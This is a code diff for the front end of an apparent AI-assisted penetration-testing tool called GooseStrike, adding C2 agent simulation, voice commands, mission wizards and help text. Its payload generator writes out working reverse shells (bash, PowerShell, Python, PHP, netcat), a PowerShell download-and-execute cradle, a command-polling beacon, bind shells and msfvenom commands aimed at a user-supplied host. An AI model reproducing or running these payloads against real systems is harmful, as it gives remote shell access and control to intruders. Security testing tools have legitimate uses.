+                        elevated: Math.random() > 0.5,
+                        status: 'active',
+                        sleep: 5,
+                        last_seen: 'just now',
+                        listener_id: listener.id
+                    };
+                    
+                    this.c2Agents.push(agent);
+                    listener.connections++;
+                    this.terminalHistory.push({ 
+                        type: 'success', 
+                        content: `[C2] 🎯 New agent callback: ${agent.hostname} (${agent.ip}) as ${agent.username}${agent.elevated ? ' [ADMIN]' : ''}` 
+                    });
+                },
+
+                refreshAgents() {
+                    this.c2Agents.forEach(agent => {
+                        if (agent.status === 'active') {
+                            agent.last_seen = 'just now';
+                        }
+                    });
+                },
+
+                interactAgent(agent) {
+                    this.selectedAgent = agent;
+                    this.activeTab = 'terminal';
+                    this.terminalHistory.push({ type: 'info', content: `[C2] Interacting with agent: ${agent.hostname} (${agent.ip})` });
+                    this.terminalHistory.push({ type: 'info', content: `[C2] Type commands to execute on the remote system` });
+                },
+
+                async taskAgent(agent, taskType, command = '') {
+                    const task = {
+                        id: 'task-' + Date.now(),
+                        agent_id: agent.id,
+                        agent_hostname: agent.hostname,
+                        type: taskType,
+                        command: command || taskType,
+                        status: 'pending',
+                        created_at: new Date().toLocaleString(),
+                        output: null
+                    };
+                    
+                    this.c2Tasks.push(task);
+                    this.terminalHistory.push({ type: 'info', content: `[C2] Queued task for ${agent.hostname}: ${task.command}` });
+                    
+                    // Simulate task execution
+                    setTimeout(() => {
+                        task.status = 'running';
+                        setTimeout(() => {
+                            task.status = 'completed';
+                            task.output = this.getSimulatedOutput(taskType, command, agent);
+                            this.terminalHistory.push({ type: 'success', content: `[C2] Task completed on ${agent.hostname}: ${task.command}` });
+                        }, 1000 + Math.random() * 2000);
+                    }, 500);
+                },
+
+                getSimulatedOutput(taskType, command, agent) {
+                    const outputs = {
+                        'whoami': agent.elevated ? `${agent.hostname}\\${agent.username}\nMandatory Label\\High Mandatory Level` : agent.username,
+                        'pwd': agent.os.includes('Windows') ? 'C:\\Users\\' + agent.username : '/home/' + agent.username.toLowerCase(),
+                        'ps': `PID   PPID  Name\n${agent.pid}  1     beacon.exe\n4     0     System\n88    4     Registry\n392   4     smss.exe\n528   520   csrss.exe\n612   520   wininit.exe`,
+                        'shell': `Executing: ${command}\n` + (command === 'whoami' ? agent.username : 'Command completed successfully')
+                    };
+                    return outputs[taskType] || outputs['shell'] || 'Task completed';
+                },
+
+                killAgent(agentId) {
+                    const agent = this.c2Agents.find(a => a.id === agentId);
+                    if (agent) {
+                        agent.status = 'dead';
+                        this.terminalHistory.push({ type: 'warning', content: `[C2] Killed agent: ${agent.hostname}` });
+                    }
+                },
+
+                clearCompletedTasks() {
+                    this.c2Tasks = this.c2Tasks.filter(t => t.status !== 'completed' && t.status !== 'failed');
+                },
+
+                refreshTasks() {
+                    // In real implementation, this would poll the backend
+                },
+
+                generatePayload() {
+                    const { type, lhost, lport, os, arch, format, encode, obfuscate } = this.payloadOptions;
+                    
+                    if (!lhost || !lport) {
+                        this.terminalHistory.push({ type: 'error', content: '[C2] LHOST and LPORT are required' });
+                        return;
+                    }
+                    
+                    let payload = '';
+                    
+                    switch(type) {
+                        case 'reverse_shell':
+                            if (os === 'linux') {
+                                payload = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+                            } else if (os === 'windows') {
+                                payload = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
+                            } else {
+                                payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+                            }
+                            break;
+                        case 'beacon':
+                            payload = `# HTTP Beacon Stager\n# Target: ${lhost}:${lport}\n\nimport urllib.request\nimport base64\nimport ssl\n\nctx = ssl.create_default_context()\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\n\nwhile True:\n    try:\n        req = urllib.request.Request(f"https://${lhost}:${lport}/beacon")\n        resp = urllib.request.urlopen(req, context=ctx)\n        cmd = base64.b64decode(resp.read()).decode()\n        if cmd:\n            import subprocess\n            out = subprocess.check_output(cmd, shell=True)\n            urllib.request.urlopen(\n                urllib.request.Request(f"https://${lhost}:${lport}/results", data=base64.b64encode(out)),\n                context=ctx\n            )\n    except: pass\n    import time; time.sleep(5)`;
+                            break;
+                        case 'meterpreter':
+                            payload = `# MSFVenom Command:\nmsfvenom -p ${os === 'windows' ? 'windows/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp'} LHOST=${lhost} LPORT=${lport} -f ${format === 'exe' ? 'exe' : format === 'elf' ? 'elf' : 'raw'} -o payload.${format === 'exe' ? 'exe' : format === 'elf' ? 'elf' : 'bin'}\n\n# Handler:\nmsfconsole -q -x "use exploit/multi/handler; set PAYLOAD ${os === 'windows' ? 'windows/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp'}; set LHOST ${lhost}; set LPORT ${lport}; run"`;
+                            break;
+                        case 'powershell':
+                            payload = `# PowerShell Download Cradle\npowershell -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/shell.ps1')"\n\n# Base64 Encoded Version:\n$cmd = 'IEX(New-Object Net.WebClient).DownloadString(''http://${lhost}:${lport}/shell.ps1'')'\n[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))`;
+                            break;
+                        case 'python':
+                            payload = `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("${lhost}",${lport}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])`;
+                            break;
+                        case 'bind_shell':
+                            if (os === 'linux') {
+                                payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp ${lport} >/tmp/f`;
+                            } else {
+                                payload = `# Windows Bind Shell (PowerShell)\n$listener = [System.Net.Sockets.TcpListener]${lport}\n$listener.Start()\n$client = $listener.AcceptTcpClient()\n$stream = $client.GetStream()\n$writer = New-Object System.IO.StreamWriter($stream)\n$reader = New-Object System.IO.StreamReader($stream)\nwhile($client.Connected) {\n  $writer.Write("PS " + (pwd).Path + "> ")\n  $writer.Flush()\n  $cmd = $reader.ReadLine()\n  $output = iex $cmd 2>&1 | Out-String\n  $writer.WriteLine($output)\n}`;
+                            }
+                            break;
+                        default:
+                            payload = `# ${type} payload for ${os} ${arch}\n# Connect back to ${lhost}:${lport}`;
+                    }
+                    
+                    if (encode && format === 'base64') {
+                        payload = btoa(payload);
+                    }
+                    
+                    this.generatedPayload = payload;
+                    this.terminalHistory.push({ type: 'success', content: `[C2] Generated ${type} payload for ${os}/${arch}` });
+                },
+
+                quickPayload(type) {
+                    const lhost = this.payloadOptions.lhost || '10.10.14.1';
+                    const lport = this.payloadOptions.lport || 4444;
+                    
+                    const payloads = {
+                        'bash_reverse': `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
+                        'nc_reverse': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
+                        'python_reverse': `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+                        'powershell_reverse': `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"`,
+                        'php_reverse': `php -r '$s=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+                        'msfvenom': `# Meterpreter Reverse TCP\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell.exe\n\n# Linux Reverse Shell\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell.elf\n\n# Web Payloads\nmsfvenom -p php/reverse_php LHOST=${lhost} LPORT=${lport} -o shell.php\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -o shell.jsp`
+                    };
+                    
+                    this.generatedPayload = payloads[type] || '';
+                },
+
+                copyPayload() {
+                    if (this.generatedPayload) {
+                        navigator.clipboard.writeText(this.generatedPayload);
+                        this.terminalHistory.push({ type: 'info', content: '[C2] Payload copied to clipboard' });
+                    }
+                },
+
+                downloadPayload() {
+                    if (!this.generatedPayload) return;
+                    const blob = new Blob([this.generatedPayload], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `payload.${this.payloadOptions.format || 'txt'}`;
+                    a.click();
+                    URL.revokeObjectURL(url);
+                },
+
+                sendToTerminal() {
+                    if (this.generatedPayload) {
+                        this.terminalInput = this.generatedPayload.split('\n')[0];
+                        this.activeTab = 'terminal';
+                    }
+                },
+
+                // ==========================================
+                // Voice Control Functions
+                // ==========================================
+                initVoice() {
+                    if (!this.voiceSupported) return;
+                    
+                    const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+                    this.speechRecognition = new SpeechRecognition();
+                    this.speechRecognition.continuous = false;
+                    this.speechRecognition.interimResults = true;
+                    this.speechRecognition.lang = 'en-US';
+                    
+                    this.speechRecognition.onstart = () => {
+                        this.voiceState = 'listening';
+                        this.voiceTranscript = '';
+                    };
+                    
+                    this.speechRecognition.onresult = (event) => {
+                        let transcript = '';
+                        for (let i = event.resultIndex; i < event.results.length; i++) {
+                            transcript += event.results[i][0].transcript;
+                        }
+                        this.voiceTranscript = transcript;
+                        if (event.results[event.results.length - 1].isFinal) {
+                            this.processVoiceCommand(transcript);
+                        }
+                    };
+                    
+                    this.speechRecognition.onerror = (event) => {
+                        console.error('Voice recognition error:', event.error);
+                        this.voiceState = 'idle';
+                        this.terminalHistory.push({ type: 'error', content: `[Voice] Error: ${event.error}` });
+                    };
+                    
+                    this.speechRecognition.onend = () => {
+                        if (this.voiceState === 'listening') {
+                            this.voiceState = 'idle';
+                        }
+                    };
+                },
+
+                toggleVoice() {
+                    if (!this.voiceSupported) {
+                        alert('Voice recognition is not supported in this browser');
+                        return;
+                    }
+                    
+                    if (!this.speechRecognition) {
+                        this.initVoice();
+                    }
+                    
+                    if (this.voiceState === 'idle') {
+                        this.speechRecognition.start();
+                    } else if (this.voiceState === 'listening') {
+                        this.speechRecognition.stop();
+                        this.voiceState = 'idle';
+                    }
+                },
+
+                async processVoiceCommand(transcript) {
+                    this.voiceState = 'processing';
+                    this.terminalHistory.push({ type: 'info', content: `[Voice] Heard: "${transcript}"` });
+                    
+                    // Simple voice command parsing
+                    const cmd = transcript.toLowerCase().trim();
+                    
+                    if (cmd.includes('scan') && (cmd.includes('network') || cmd.includes('target'))) {
+                        this.userInput = `Scan the target network for open ports`;
+                        await this.sendMessage();
+                    } else if (cmd.includes('help') || cmd.includes('what can you do')) {
+                        this.showHelpPanel = true;
+                    } else if (cmd.includes('terminal') || cmd.includes('shell')) {
+                        this.activeTab = 'terminal';
+                    } else if (cmd.includes('c2') || cmd.includes('command and control')) {
+                        this.activeTab = 'c2';
+                    } else if (cmd.includes('findings') || cmd.includes('vulnerabilities')) {
+                        this.activeTab = 'findings';
+                    } else {
+                        // Send as chat message
+                        this.userInput = transcript;
+                        await this.sendMessage();
+                    }
+                    
+                    this.voiceState = 'idle';
+                },
+
+                speak(text) {
+                    if ('speechSynthesis' in window) {
+                        this.voiceState = 'speaking';
+                        const utterance = new SpeechSynthesisUtterance(text);
+                        utterance.rate = 1.0;
+                        utterance.pitch = 1.0;
+                        utterance.onend = () => {
+                            this.voiceState = 'idle';
+                        };
+                        speechSynthesis.speak(utterance);
+                    }
+                },
+
+                // ==========================================
+                // Wizard Functions
+                // ==========================================
+                startWizard(type = 'mission_planning') {
+                    this.wizardType = type;
+                    this.wizardStep = 1;
+                    this.wizardData = {};
+                    
+                    const wizardConfigs = {
+                        'first_time': {
+                            title: '🦆 Welcome to GooseStrike',
+                            steps: [
+                                {
+                                    title: 'Set Your First Target',
+                                    description: 'Enter the IP address or hostname of your authorized target.',
+                                    fields: [
+                                        { name: 'target', label: 'Target IP/Hostname', type: 'text', placeholder: '10.10.10.1 or target.htb' },
+                                        { name: 'scope', label: 'Engagement Scope', type: 'select', options: [
+                                            { value: 'single', label: 'Single Host' },
+                                            { value: 'subnet', label: 'Subnet/Range' },
+                                            { value: 'web', label: 'Web Application' }
+                                        ]}
+                                    ],
+                                    tips: ['Always ensure you have proper authorization', 'Start with passive recon before active scanning']
+                                },
+                                {
+                                    title: 'Choose Your Approach',
+                                    description: 'Select how you want to begin the engagement.',
+                                    fields: [
+                                        { name: 'approach', label: 'Initial Approach', type: 'select', options: [
+                                            { value: 'stealth', label: 'Stealth (Slow, low noise)' },
+                                            { value: 'balanced', label: 'Balanced (Normal speed)' },
+                                            { value: 'aggressive', label: 'Aggressive (Fast, noisy)' }
+                                        ]},
+                                        { name: 'focus', label: 'Primary Focus', type: 'select', options: [
+                                            { value: 'infrastructure', label: 'Infrastructure' },
+                                            { value: 'web', label: 'Web Applications' },
+                                            { value: 'ad', label: 'Active Directory' }
+                                        ]}
+                                    ],
+                                    tips: ['Stealth mode uses timing and technique evasion', 'CTF/Labs can use aggressive mode']
+                                },
+                                {
+                                    title: 'Ready to Strike!',
+                                    description: 'Review your configuration and start your engagement.',
+                                    fields: [],
+                                    tips: ['GooseStrike will guide you through each phase', 'Use the AI chat for real-time assistance', 'All commands are logged for your report']
+                                }
+                            ]
+                        },
+                        'mission_planning': {
+                            title: '🎯 Mission Planning',
+                            steps: [
+                                {
+                                    title: 'Define Your Target',
+                                    description: 'Specify the target scope for this mission.',
+                                    fields: [
+                                        { name: 'target', label: 'Target', type: 'text', placeholder: 'IP, hostname, or CIDR range' },
+                                        { name: 'name', label: 'Mission Name', type: 'text', placeholder: 'Operation Honeybadger' }
+                                    ],
+                                    tips: ['Use descriptive mission names for report clarity']
+                                },
+                                {
+                                    title: 'Set Objectives',
+                                    description: 'What are you trying to achieve?',
+                                    fields: [
+                                        { name: 'objective', label: 'Primary Objective', type: 'select', options: [
+                                            { value: 'foothold', label: 'Gain Initial Foothold' },
+                                            { value: 'privesc', label: 'Privilege Escalation' },
+                                            { value: 'data', label: 'Data Exfiltration' },
+                                            { value: 'persistence', label: 'Establish Persistence' },
+                                            { value: 'full', label: 'Full Compromise' }
+                                        ]},
+                                        { name: 'notes', label: 'Additional Notes', type: 'textarea', placeholder: 'Any specific requirements...' }
+                                    ]
+                                },
+                                {
+                                    title: 'Configure Constraints',
+                                    description: 'Set any operational constraints.',
+                                    fields: [
+                                        { name: 'timeLimit', label: 'Time Limit', type: 'select', options: [
+                                            { value: 'none', label: 'No Limit' },
+                                            { value: '1h', label: '1 Hour' },
+                                            { value: '4h', label: '4 Hours' },
+                                            { value: '24h', label: '24 Hours' }
+                                        ]},
+                                        { name: 'noisy', label: 'Noise Level', type: 'select', options: [
+                                            { value: 'quiet', label: 'Quiet (Evade detection)' },
+                                            { value: 'normal', label: 'Normal' },
+                                            { value: 'loud', label: 'Loud (Speed priority)' }
+                                        ]}
+                                    ]
+                                }
+                            ]
+                        },
+                        'guided_tour': {
+                            title: '🦆 GooseStrike Tour',
+                            steps: [
+                                {
+                                    title: 'The Command Center',
+                                    description: 'This is your AI-powered penetration testing assistant. Ask questions, get recommendations, and let GooseStrike guide your engagement.',
+                                    fields: [],
+                                    tips: ['Type natural language commands', 'Ask for tool recommendations', 'Request explanations of findings']
+                                },
+                                {
+                                    title: 'Phase-Based Workflow',
+                                    description: 'The left sidebar shows the penetration testing phases: Recon → Scanning → Vuln Assessment → Exploitation → Post-Exploitation.',
+                                    fields: [],
+                                    tips: ['Click a phase to see relevant tools', 'Quick actions are available for common tasks', 'The AI adapts recommendations to your current phase']
+                                },
+                                {
+                                    title: 'Terminal & Network Map',
+                                    description: 'Execute commands directly in the Terminal tab. View discovered hosts and their relationships in the Network tab.',
+                                    fields: [],
+                                    tips: ['Commands run in an isolated Kali container', 'Network map updates automatically', 'Click hosts to see details']
+                                },
+                                {
+                                    title: 'C2 Framework',
+                                    description: 'The C2 tab provides command and control capabilities: manage listeners, track agents, and generate payloads.',
+                                    fields: [],
+                                    tips: ['Supports multiple listener types', 'Generate reverse shells quickly', 'Task agents with commands']
+                                }
+                            ]
+                        }
+                    };
+                    
+                    const config = wizardConfigs[type] || wizardConfigs['mission_planning'];
+                    this.wizardTitle = config.title;
+                    this.wizardSteps = config.steps;
+                    this.showWizardModal = true;
+                },
+
+                completeWizard() {
+                    this.showWizardModal = false;
+                    
+                    if (this.wizardType === 'first_time' || this.wizardType === 'mission_planning') {
+                        // Apply wizard configuration
+                        if (this.wizardData.target) {
+                            this.userInput = `Start reconnaissance on ${this.wizardData.target}`;
+                            this.sendMessage();
+                        }
+                        this.terminalHistory.push({ type: 'success', content: `[Wizard] Mission configured: ${this.wizardData.name || 'New Mission'}` });
+                    }
+                    
+                    this.wizardData = {};
+                },
+
+                // ==========================================
+                // Explain Functions
+                // ==========================================
+                async explainThis(type, context) {
+                    this.explainContext = { type, ...context };
+                    this.showExplainModal = true;
+                    this.explainLoading = true;
+                    this.explainResult = null;
+                    
+                    try {
+                        // Call backend explain API
+                        const response = await fetch('/api/explain', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ type, context })
+                        });
+                        
+                        if (response.ok) {
+                            this.explainResult = await response.json();
+                        } else {
+                            // Fallback to local explanations
+                            this.explainResult = this.getLocalExplanation(type, context);
+                        }
+                    } catch (error) {
+                        console.error('Explain error:', error);
+                        this.explainResult = this.getLocalExplanation(type, context);
+                    }
+                    
+                    this.explainLoading = false;
+                },
+
+                getLocalExplanation(type, context) {
+                    const explanations = {
+                        'port': {
+                            title: `Port ${context.port}/${context.protocol || 'tcp'}`,
+                            description: this.getPortDescription(context.port),
+                            recommendations: this.getPortRecommendations(context.port),
+                            example: this.getPortExample(context.port)
+                        },
+                        'service': {
+                            title: `Service: ${context.service}`,
+                            description: `${context.service} is a common service found on target systems.`,
+                            recommendations: ['Check for known vulnerabilities', 'Look for default credentials', 'Test for misconfigurations']
+                        },
+                        'tool': {
+                            title: `Tool: ${context.tool}`,
+                            description: `${context.tool} is a penetration testing tool used in security assessments.`,
+                            recommendations: ['Check the manual with --help', 'Use appropriate scan intensity', 'Document all findings']
+                        },
+                        'finding': {
+                            title: `Finding: ${context.title || 'Security Issue'}`,
+                            description: context.description || 'A potential security issue was discovered.',
+                            recommendations: ['Verify the finding manually', 'Assess business impact', 'Document exploitation steps'],
+                            warnings: context.severity === 'critical' ? ['This is a critical finding - proceed with caution'] : []
+                        }
+                    };
+                    
+                    return explanations[type] || { title: 'Explanation', description: 'Information not available.' };
+                },
+
+                getPortDescription(port) {
+                    const ports = {
+                        21: 'FTP (File Transfer Protocol) - Used for file transfers. Often misconfigured with anonymous access.',
+                        22: 'SSH (Secure Shell) - Encrypted remote access. Check for weak credentials or old versions.',
+                        23: 'Telnet - Unencrypted remote access. Sensitive data transmitted in plaintext.',
+                        25: 'SMTP (Simple Mail Transfer Protocol) - Email server. Check for open relay.',
+                        53: 'DNS (Domain Name System) - Name resolution. Zone transfers may leak info.',
+                        80: 'HTTP - Web server. Check for web vulnerabilities.',
+                        443: 'HTTPS - Encrypted web server. Check SSL/TLS configuration.',
+                        445: 'SMB (Server Message Block) - Windows file sharing. Often targeted for exploits.',
+                        3306: 'MySQL - Database server. Check for weak auth.',
+                        3389: 'RDP (Remote Desktop Protocol) - Windows remote desktop. BlueKeep vulnerable versions exist.',
+                        5432: 'PostgreSQL - Database server. Check for default credentials.',
+                        6379: 'Redis - In-memory database. Often unprotected.'
+                    };
+                    return ports[port] || `Port ${port} - Check service fingerprinting for more details.`;
+                },
+
+                getPortRecommendations(port) {
+                    const recs = {
+                        21: ['Check for anonymous FTP access', 'Try common credentials', 'Look for writeable directories'],
+                        22: ['Enumerate SSH version', 'Try password spray', 'Check for known CVEs'],
+                        80: ['Run directory enumeration', 'Check for common vulnerabilities', 'Identify web technologies'],
+                        443: ['Check SSL/TLS configuration', 'Look for certificate info disclosure', 'Same tests as port 80'],
+                        445: ['Enumerate SMB shares', 'Check for EternalBlue', 'Try null session'],
+                        3389: ['Check for BlueKeep', 'Try credential spray', 'Look for NLA bypass']
+                    };
+                    return recs[port] || ['Fingerprint the service', 'Check for default credentials', 'Search for known CVEs'];
+                },
+
+                getPortExample(port) {
+                    const examples = {
+                        21: 'ftp 10.10.10.1\n> anonymous\n> anonymous@',
+                        22: 'ssh -o StrictHostKeyChecking=no user@10.10.10.1',
+                        80: 'gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt',
+                        445: 'smbclient -L //10.10.10.1 -N',
+                        3389: 'xfreerdp /u:user /v:10.10.10.1'
+                    };
+                    return examples[port] || `nmap -sV -p ${port} 10.10.10.1`;
+                },
+
+                // ==========================================
+                // Help Panel Functions
+                // ==========================================
+                async sendHelpMessage() {
+                    if (!this.helpInput.trim()) return;
+                    
+                    const userMessage = {
+                        role: 'user',
+                        content: this.helpInput,
+                        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+                    };
+                    this.helpMessages.push(userMessage);
+                    this.helpInput = '';
+                    this.helpLoading = true;
+                    
+                    // Scroll to bottom
+                    this.$nextTick(() => {
+                        const container = document.getElementById('help-messages');
+                        if (container) container.scrollTop = container.scrollHeight;
+                    });
+                    
+                    try {
+                        const response = await fetch('/api/help', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ question: userMessage.content })
+                        });
+                        
+                        let answer = '';
+                        if (response.ok) {
+                            const data = await response.json();
+                            answer = data.answer || data.response || 'I can help with that!';
+                        } else {
+                            answer = this.getLocalHelp(userMessage.content);
+                        }
+                        
+                        this.helpMessages.push({
+                            role: 'assistant',
+                            content: answer,
+                            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+                        });
+                    } catch (error) {
+                        this.helpMessages.push({
+                            role: 'assistant',
+                            content: this.getLocalHelp(userMessage.content),
+                            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+                        });
+                    }
+                    
+                    this.helpLoading = false;
+                    this.$nextTick(() => {
+                        const container = document.getElementById('help-messages');
+                        if (container) container.scrollTop = container.scrollHeight;
+                    });
+                },
+
+                askHelpQuestion(question) {
+                    this.helpInput = question;
+                    this.sendHelpMessage();
+                },
+
+                getLocalHelp(question) {
+                    const q = question.toLowerCase();
+                    
+                    if (q.includes('scan') && q.includes('network')) {
+                        return `To scan a network:\n\n1. Go to the **Recon** phase\n2. Click **Quick Port Scan** or use the terminal\n3. Example: \`nmap -sV 10.10.10.0/24\`\n\nYou can also ask me in the main chat!`;
+                    }
+                    if (q.includes('c2') || q.includes('command and control')) {
+                        return `The **C2 tab** provides:\n\n- **Listeners**: Create HTTP/HTTPS/TCP listeners\n- **Agents**: Manage connected agents\n- **Payloads**: Generate reverse shells\n- **Tasks**: Send commands to agents\n\nClick the C2 tab to get started!`;
+                    }
+                    if (q.includes('payload') || q.includes('reverse shell')) {
+                        return `To generate payloads:\n\n1. Go to **C2 tab** → **Payloads**\n2. Set your LHOST and LPORT\n3. Choose OS and format\n4. Click **Generate**\n\nOr use Quick Payloads for common shells!`;
+                    }
+                    if (q.includes('mission') || q.includes('planning')) {
+                        return `Mission planning workflow:\n\n1. Click **Start Wizard** in the sidebar\n2. Define your target and scope\n3. Set objectives and constraints\n4. GooseStrike guides you through each phase\n\nThe AI will adapt recommendations based on your mission!`;
+                    }
+                    
+                    return `I'm here to help with GooseStrike!\n\nI can assist with:\n- Network scanning\n- Exploitation techniques\n- C2 framework usage\n- Payload generation\n- Report generation\n\nWhat would you like to know?`;
+                },
+
+                // Simple markdown renderer
+                renderMarkdown(text) {
+                    if (!text) return '';
+                    return text
+                        .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+                        .replace(/\*(.*?)\*/g, '<em>$1</em>')
+                        .replace(/`(.*?)`/g, '<code class="bg-sp-grey px-1 rounded">$1</code>')
+                        .replace(/\n/g, '<br>');
                 }
             }
         }
